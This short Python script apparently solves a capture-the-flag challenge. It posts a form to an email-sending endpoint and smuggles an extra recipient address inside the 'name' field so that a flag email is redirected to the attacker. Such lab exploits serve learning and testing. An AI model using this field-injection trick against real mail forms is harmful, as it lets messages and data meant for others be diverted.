import requests
from urllib.parse import urlencode


# define payload
payload = urlencode({
        "name": "Legoclones <INSERT_EMAIL_HERE@gmail.com> ",
        "email": "admin@email.invalid",
    })


# send request and get result
result = requests.request("POST", "https://postmaster.boats/send_email", data=payload, headers={'Content-Type': 'application/x-www-form-urlencoded'})


# check response
if "Email sent!" in result.text:
    print("Check your email for the flag")
else:
    print("Something went wrong")
    print(result.text)